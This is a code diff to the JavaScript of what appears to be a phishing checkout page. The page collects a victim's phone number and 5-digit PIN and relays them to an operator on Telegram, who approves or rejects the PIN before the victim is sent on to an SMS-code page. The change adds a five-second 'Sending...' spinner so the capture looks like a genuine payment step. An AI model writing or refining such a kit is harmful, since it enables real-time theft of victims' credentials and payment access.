@@ -3,8 +3,9 @@
    Reads ?plan and ?sid, renders the amount, wires phone + 5-digit PIN.
    On Confirm:
      1. POST /api/checkout (sends phone + PIN to the operator on
-        Telegram with Approve/Reject buttons)
-     2. navigate to sms.html immediately (no waiting here)
+        Telegram with Approve/Reject PIN buttons)
+     2. show the "Sending..." spinner for AT LEAST 5 seconds
+     3. navigate to sms.html
 
    If the URL carries ?error=pin_rejected (a bounce back from the SMS
    page after the operator rejected the PIN), the error is shown and
@@ -17,6 +18,8 @@
   var DEFAULT_PLAN_CODE = "premium";
   var SMS_PAGE = "sms.html";
   var PIN_LENGTH = 5;
+  var CONFIRM_DWELL_MS = 5000;
+
   var LOADER_ID = "payment-loader";
   var LOADER_TITLE_ID = "loader-title";
   var LOADER_BODY_ID = "loader-body";
@@ -141,10 +144,13 @@
 
       showLoader("Sending...", "Sending your details to the operator");
 
-      function proceed() {
+      var post = postCheckout(sessionId, phone, pin).catch(function () {});
+      var dwell = new Promise(function (resolve) {
+        global.setTimeout(resolve, CONFIRM_DWELL_MS);
+      });
+      Promise.all([post, dwell]).then(function () {
         navigateToSms(plan, phone, sessionId);
-      }
-      postCheckout(sessionId, phone, pin).then(proceed).catch(proceed);
+      });
     });
 
     syncConfirmState(pinInput, confirmBtn);
